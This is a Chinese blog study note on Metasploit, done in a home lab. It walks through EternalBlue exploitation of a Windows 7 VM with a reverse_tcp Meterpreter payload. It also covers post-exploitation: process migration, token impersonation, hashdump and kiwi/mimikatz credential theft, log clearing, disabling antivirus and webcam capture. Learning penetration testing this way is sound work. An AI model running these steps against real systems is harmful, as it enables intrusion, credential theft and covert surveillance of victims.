<h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><ul>
<li><p>Metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接</p>
</li>
<li><p>有很多功能：比如添加一个用户、打开shell、得到用户密码、上传下载远程主机的文件、捕捉屏幕、得到远程控制权、捕获按键信息、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息</p>
</li>
<li><p>能够躲避入侵检测系统。它不改变系统硬盘中的文件，因此HIDS（基于主机的入侵检测系统）很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它也会变得非常困难</p>
</li>
<li><p>简化任务创建多个会话，可以来利用这些会话进行渗透<del>（以上是我copy的）</del></p>
</li>
</ul>
<h2 id="命令合集"><a href="#命令合集" class="headerlink" title="命令合集"></a>命令合集</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>background</td>
<td>让 meterpreter 处于后台模式</td>
</tr>
<tr>
<td>sessions -i index</td>
<td>与会话进行交互，index表示第几个session</td>
</tr>
<tr>
<td>sessions -l</td>
<td>列出当前所有的session</td>
</tr>
<tr>
<td>quit</td>
<td>退出会话</td>
</tr>
<tr>
<td>shell</td>
<td>获得控制台权限</td>
</tr>
</tbody></table>
<h3 id="清理日志-clearev"><a href="#清理日志-clearev" class="headerlink" title="清理日志 clearev"></a>清理日志 clearev</h3><p>​	虽然 Meterpreter的纯内存工作使被发现的风险降低了，但通过 Meterpreter 对目标主机的操作过程中，难免会产生日志留下痕迹，我们可以用命令进行删除</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-18.jpg" alt="Metaspoilt-18"></p>
<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>ps</td>
<td>查看当前活跃的进程</td>
</tr>
<tr>
<td>getpid</td>
<td>获取当前进程的pid</td>
</tr>
<tr>
<td>getuid</td>
<td>查看当前 目标主机 己渗透成功的用户名</td>
</tr>
<tr>
<td>kill pid</td>
<td>杀死进程</td>
</tr>
<tr>
<td>sysinfo</td>
<td>查看目标主机的系统信息，如操作系统 体系结构</td>
</tr>
</tbody></table>
<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>cat</td>
<td>查看文件内容</td>
</tr>
<tr>
<td>getwd</td>
<td>查看当前工作目录(pwd也可以)</td>
</tr>
<tr>
<td>upload</td>
<td>上传文件(文件夹)到目标机上</td>
</tr>
<tr>
<td>download</td>
<td>下载 文件(文件夹) 到 攻击机</td>
</tr>
<tr>
<td>edit</td>
<td>编辑文件</td>
</tr>
<tr>
<td>search</td>
<td>搜索文件</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search -f *.txt -d c:\\</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">搜索 C盘中以 .txt 为扩展名的文件</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">-f:用于指定搜索文件模式</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">-d:用于指定在哪个目录下进行搜索</span></span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>run post&#x2F;windows&#x2F;gather&#x2F;checkvm</td>
<td>检查 目标主机 是否运行在虚拟机上</td>
</tr>
<tr>
<td>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</td>
<td>启动 目标主机 的远程桌面协议</td>
</tr>
<tr>
<td>run post&#x2F;windows&#x2F;manage&#x2F;killav</td>
<td>关闭 目标主机 系统杀毒软件</td>
</tr>
<tr>
<td>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users</td>
<td>列举当前有多少用户登录了 目标主机</td>
</tr>
<tr>
<td>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</td>
<td>列举安装在 目标主机 的程序</td>
</tr>
<tr>
<td>screenshot</td>
<td>抓取 目标主机的 屏幕截图</td>
</tr>
<tr>
<td>webcam_list</td>
<td>查看 目标主机 也没有摄像头</td>
</tr>
<tr>
<td>webcam_snap</td>
<td>打开目标摄像头</td>
</tr>
<tr>
<td>webcam_stream</td>
<td>开启直播模式</td>
</tr>
</tbody></table>
<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><ul>
<li><p>msfpayload 和 msfencode 的结合，现在基本都是将这两个工具集合到一个框架实例中</p>
</li>
<li><p>是一个生成后门的软件，可以在目标机上执行并在本地监听</p>
</li>
</ul>
<h1 id="渗透攻击步骤"><a href="#渗透攻击步骤" class="headerlink" title="渗透攻击步骤"></a>渗透攻击步骤</h1><p>​	使用 MSF 渗透测试时，对目标系统 进行侦察 并 发起攻击。大致步骤如下：</p>
<ul>
<li>扫描目标机系统，寻找可用漏洞</li>
<li>选择并适配一个 漏洞利用模块</li>
<li>选择并适配一个 攻击载荷模块</li>
<li>选择一个编码技术，绕过杀毒软件（免杀）</li>
<li>渗透攻击</li>
</ul>
<h2 id="主机扫描-辅助模块"><a href="#主机扫描-辅助模块" class="headerlink" title="主机扫描(辅助模块)"></a>主机扫描(辅助模块)</h2><p>​	尽可能多地发现有关目标机器的信息。获取的信息越多，渗透的概率就越大。主要关注点是 目标机器的IP地址、可用服务、开放端口等</p>
<p><strong>端口扫描</strong></p>
<p>​	首先输入 <strong>msfconsole</strong> 启动 控制终端（每次显示的图形都不一样，还挺有意思的），利用 <strong>search</strong> 命令 搜索有哪些可用端口模块，如图可看到可用的扫描器列表，包含了各种扫描类型(以TCP为例)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-01.jpg"></p>
<p>​	输入 <strong>use</strong> 使用漏洞利用模块，<strong>show options</strong> 命令可以查看需要设置的参数</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-02.jpg"></p>
<p>​	在 Required 中被标记为 yes 的参数必须包含实际值，RHOSTS 设置为待扫描的IP地址、PORTS为扫描端口范围、THREADS为扫描线程，线程越多，扫描速度越快。使用 <strong>set</strong> 命令设置参数，<strong>unset</strong>取消设置参数值，设置好后，输入 <strong>run</strong> 或者 <strong>exploit</strong> 运行，可以看到目标主机开了 80 147 369 902 912 五个端口</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-03.jpg"></p>
<ul>
<li>ftpbounce：通过 ftp bounce 攻击的原理对 TCP 服务进行枚举，一些旧的 Solaris(UNIX的衍生版本之一) 和 FreeBSD(一种类UNIX操作系统) 系统的 FTP 服务中此类攻击能被利用(新的不行哦)</li>
<li>xmas：更为隐蔽的扫描方式。通过发送 FIN、PSH、URG标志，躲过一些 TCP标记检测器 的过滤</li>
<li>ack：通过 ACK 扫描的方式对防火墙上未被屏蔽的端口进行探测</li>
<li>syn：发送 TCP SYN 标志的方式探测开放端口</li>
</ul>
<p><strong>用 Nmap 扫描</strong></p>
<p>​	在 Metaspoilt 也可用 Nmap 扫描，用法与nmap一样。其可以用来确定 目标网络上主机的存活状态，而且可以扫描 计算机的 开放端口、开启服务的版本等</p>
<p><strong>服务扫描</strong></p>
<p>​	很多 网络服务 是 漏洞频发的 高危对象，对 特定服务进行扫描，可以提高渗透的几率，在 scanner 中有很多用于服务扫描的工具，其<strong>大都</strong>以 <strong>service-name_version</strong> 和 <strong>service-name_login</strong> 命名</p>
<ul>
<li>service-name_version：可用于遍历网络中包含了 某种服务 的主机，并逐一确定 其版本</li>
<li>service-name_login：可对某种服务进行 口令探测攻击</li>
</ul>
<p>（并非 所有的模块 都按照这种命名方式进行开发）</p>
<table>
<thead>
<tr>
<th>网络服务扫描</th>
<th>服务描述</th>
</tr>
</thead>
<tbody><tr>
<td>auxiliary&#x2F;scanner&#x2F;talnet&#x2F;talnet_version</td>
<td>远程登录服务器，类似与 SSH</td>
</tr>
<tr>
<td>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version</td>
<td>为 远程登录会话 和 其他网络服务 提供的安全性协议</td>
</tr>
<tr>
<td>auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnslsnr_version</td>
<td>数据库服务</td>
</tr>
</tbody></table>
<ol>
<li>Telnet：其没有对传输的数据进行加密，更安全的 SSH协议 代替了它，但许多 旧版网络设备 不支持 SSH协议，网络上有很多 交换机、路由器等仍在使用Telnet</li>
<li>SSH：类UNIX 系统上最常见的远程管理服务，采用更安全的加密信息传输。但如果没有做其他的安全配置(如限制管理登陆的IP地址)，只要知道服务器的登录口令，就可以使用 SSH 登录服务器</li>
<li>Oracle SQL：监听器(tnslsnr) 使用的是1521端口，使用 <strong>tnslsnr_version</strong> 在网络中发现服务器开放的 Oracle 数据库，并获取其版本号</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>MS17-010远程溢出漏洞 - 永恒之蓝 [CVE-2017-0143]</strong> </p>
<p>​	爆发于2017年4月14日晚，是一种利用Windows系统的 SMB协议漏洞 来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复</p>
<p><strong>影响版本</strong></p>
<p>​	目前已知受影响的Windows 版本包括但不限于：Windows Vista SP2，Windows Server 2008 SP2和R2 SP1，Windows 7 SP1，Windows 8.1，Windows Server 2012 Gold和R2，Windows RT 8.1，Windows 10 Gold，1511和1607，Windows Server 2016</p>
<p><strong>SMB协议</strong> （Server Message Block）</p>
<ul>
<li>被用于 Web连接 和 客户端 与 服务器 之间的信息沟通</li>
<li>是一种 客户机&#x2F;服务器、请求&#x2F;响应协议，通过SMB协议 可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的</li>
<li>SMB协议工作在 应用层 和 会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口 (<strong>445</strong>端口 的开放则此设备可能存在对应漏洞)</li>
</ul>
<p>条件：两台主机可以相互ping通，靶机（无补丁）开启了445端口，且防火墙关闭的</p>
<p>攻击机：Kali-Linux IP：192.168.0.107</p>
<p>靶机：Windows 7 IP：192.168.0.108（先关闭控制面板中的防火墙）</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-04.jpg" alt="Metaspoilt-04"></p>
<ul>
<li><p>输入 msfconsole 进入 Metasploit 终端，搜索 <strong>MS17_010</strong> 的漏洞利用模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search MS17_010</span><br><span class="line">    # auxiliary/scanner/smb/smb_ms17_010：永恒之蓝扫描模块	</span><br><span class="line">    # exploit/windows/smb/ms17_010_eternalblue：永恒之蓝攻击模块</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-05.jpg" alt="Metaspoilt-05"></p>
</li>
<li><p>使用 <strong>auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong> 对目标主机进行扫描，若存在漏洞，就利用攻击模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.0.108</span><br><span class="line">rhosts =&gt; 192.168.0.108</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.0.108:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.0.108:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">成功发现永恒之蓝漏洞的存在</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来使用 <strong>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong> 模块进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue		#使用永恒之蓝攻击模块</span><br><span class="line">set rhosts 192.168.0.108							#设置目标主机的地址</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp		#设置payload</span><br><span class="line">set lhost 192.168.0.107 							#设置攻击机的地址，非必需</span><br><span class="line">set lport 445										#设置目标主机回连至攻击机的端口，非必需</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置完成后，输入 run 运行</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-06.jpg" alt="Metaspoilt-06"></p>
</li>
</ul>
<p>使用 shell 命令得到靶机shell，chcp 65001 命令更改字符集（但不能完全解决乱码问题）</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-07.jpg" alt="Metaspoilt-07"></p>
<h2 id="后渗透攻击：信息收集"><a href="#后渗透攻击：信息收集" class="headerlink" title="后渗透攻击：信息收集"></a>后渗透攻击：信息收集</h2><p>​	成功对目标主机攻击渗透后，Metasploit 还提供了后渗透工具 Meterpreter，该工具有很多功能</p>
<ul>
<li>纯内存工作模式，不需要对磁盘进行任何写入操作</li>
<li>使用加密通信协议</li>
<li>在被攻击进程内工作，不需创建新的进程</li>
<li>易于在多进程间迁移</li>
<li>适用于 Windows、Linux、BSD系统</li>
</ul>
<p><strong>进程迁移</strong></p>
<p>​	刚获得 shell 时，该 shell 是极易受到攻击的，如 攻击者 可以利用 浏览器漏洞 攻陷目标主机，但攻击渗透成功后浏览器可能被用户关闭。所以我们要移动这个 shell，将它与 目标主机的一个稳定的进程 绑到一起，而不需要对磁盘进行写入操作，这样渗透更难被检测到</p>
<ul>
<li>输入 <strong>ps</strong> 命令查看目标主机正运行的程序</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-08.jpg" alt="Metaspoilt-08"></p>
<ul>
<li>输入 <strong>getpid</strong> 可查看 meterpreter shell的进程号1964；然后输入 <strong>migrate 1220</strong> 将 shell 移动到 PID 为1220 的Explorer.exe进程里，因为该进程是一个稳定的应用</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-09.jpg" alt="Metaspoilt-09"></p>
<ul>
<li>进程迁移完后，原先 PID 为1964的进程会自动关闭，若没有自动关闭可 以输 <strong>kill 1964</strong> 命令杀掉该进程</li>
<li>也可以使用自动迁移进程命令 <strong>run post&#x2F;windows&#x2F;manage&#x2F;migrate</strong> ，系统会寻找合适的进程</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-10.jpg" alt="Metaspoilt-10"></p>
<h2 id="后渗透攻击：权限提升"><a href="#后渗透攻击：权限提升" class="headerlink" title="后渗透攻击：权限提升"></a>后渗透攻击：权限提升</h2><p>​	在渗透过程中很可能只获得一个系统的 Guest 或者 User 权限，低的权限自然会有很多的限制，没有管理员权限就无法 获取Hash、安装软件、修改防火墙规则等，所以必须将访问权限从 Guest 升到 User，再到 Administrator，最终 system 级别</p>
<ol>
<li>纵向提权：低权限的用户 获取 高权限</li>
<li>横向提权：获取 同级别角色 的权限</li>
</ol>
<h3 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h3><p>​	令牌(token)是系统的临时密钥，相当于 账户名 和 密码，它允许 用户 在不提供密码或其他凭证的前提下，访问网络和系统资源。</p>
<p>​	令牌有很多种，比如访问令牌表示访问控制主题的系统对象；密保令牌一种计算机身份校验的物理设备，例如U盾，又叫作认证令牌或者硬件令牌；会话令牌是交互会话 唯一的身份标识符</p>
<blockquote>
<p>只适用于Windows 2008 及之前的老版本</p>
</blockquote>
<p>​	需要用到 Kerberos协议，一种网络认证协议，可以通过密钥系统为 客户机&#x2F;服务器 应用程序提供认证服务 </p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-16.jpg" alt="Metaspoilt-16"></p>
<p><strong>客户端请求证书流程</strong></p>
<ul>
<li><p>客户端 请求 认证服务器AS，要求得到服务器的证书</p>
</li>
<li><p>AS收到请求后，会将包含 客户端密钥的加密证书 响应给客户端，认证服务器AS也会给服务器发送一份该证书，用来使服务器确认客户端身份</p>
<ul>
<li>证书 包括服务器ticket （包括服务器密钥加密的客户机身份 和 一份会话密钥）和 一个临时加密密钥</li>
</ul>
</li>
<li><p>客户端将 ticket 传送到服务器上，服务器确认该客户端的话，便允许它登录服务器</p>
</li>
<li><p>客户端登录成功后，攻击者就可以通过入侵服务器获取客户端的令牌</p>
</li>
</ul>
<p><strong>实战</strong></p>
<p>先输入 <strong>use incognito</strong> 加载 incognito 扩展，然后输入 <strong>list_tokens -u</strong> 查看可用的token</p>
<ul>
<li>可以看到有两种类型的令牌（令牌的数量其实取决于Meterpreter Shell 的访问级别）</li>
<li>一种是Delegation Tokens，是授权令牌，它支持交互式登录（例如可以通过远程桌面登录访问）</li>
<li>还有一种是Impersonation Tokens,  是模拟令牌，非交互的会话</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-17.jpg" alt="Metaspoilt-17"></p>
<ul>
<li><p>使用 <strong>impersonate_token ‘NT AUTHORITY\SYSTEM’</strong> 假冒SYSTEM token</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">impersonate_token NT\ AUTHORITY\\SYSTEM 			#也可以，如果不加引号 需使用\\</span><br><span class="line">impersonate_token WIN-LTBCGLQDHV5\\test 			#假冒test用户</span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">WIN-LTBCGLQDHV5是主机名,<span class="built_in">test</span>表示登录的用户名,二者之间用 \\ 间隔</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Hash-攻击"><a href="#Hash-攻击" class="headerlink" title="Hash 攻击"></a>Hash 攻击</h3><ol>
<li>Hashdump</li>
</ol>
<p>​	Hashdump Meterpreter脚本可以从 目标主机 中提取 Hash 值，破解 Hash 值即可获得登录密码</p>
<p>​	计算机中每个账号的 用户名 和 密码 都存储在 sam文件 中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有 system 权限</p>
<ul>
<li><p>输入 <strong>hashdump</strong> 命令，可导出目标主机 sam文件 中的Hash值，非 system 权限下会失败</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-11.jpg" alt="Metaspoilt-11"></p>
</li>
</ul>
<p>这里有两个不同的口令信息， LAN Manager(LM)口令散列算法 和 其加密NT版，即<strong>LM Hash</strong> 和 <strong>NTLM Hash</strong></p>
<ul>
<li><p>但其在Windows 7、Windows Server 2008下有时候会出现进程移植不成功等问题，smart hashdump模块的功能更为强大，可以导出域所有用户的Hash值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>kiwi（mimikatz）</li>
</ol>
<p>​	能够直接读取WindowsXP-2012等操作系统的明文密码，但必须在管理员权限下使用</p>
<ul>
<li><p>mimikatz 已被 kiwi 所取代，所以现在用 <strong>load kiwi</strong> 来加载 kiwi 模块</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-12.jpg"></p>
</li>
<li><p>输入 <strong>help kiwi</strong> 命令即可列出所有的命令</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-13.jpg" alt="Metaspoilt-13"></p>
</li>
</ul>
<p><del>(看书上说什么还要加载一个错误的模块得到可用模块的完整列表，其他的我不知道，我用的时候只需输入 kiwi 的 commands 就行了)</del></p>
<ul>
<li><p>输入 <strong>creds_msv</strong> 命令抓取用户Hash值(我这里只有一个用户)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-14.jpg" alt="Metaspoilt-14"></p>
</li>
<li><p>输入 <strong>creds_wdigest</strong> 命令可以获取系统账户信息(这里的密码是被解密的，parsed是 解析 的意思)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/200-20N/201/Metaspoilt-15.jpg" alt="Metaspoilt-15"></p>
</li>
</ul>
<p>参考：</p>
<p>《Web安全攻防：渗透测试实战指南》———第5章 Metasploit 技术</p>
<p><a href="https://www.bilibili.com/video/BV16R4y157vT/">视频链接</a></p>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>通向成神之路的N%之力(中二病犯了)</tag>
      </tags>
  </entry>
</search>
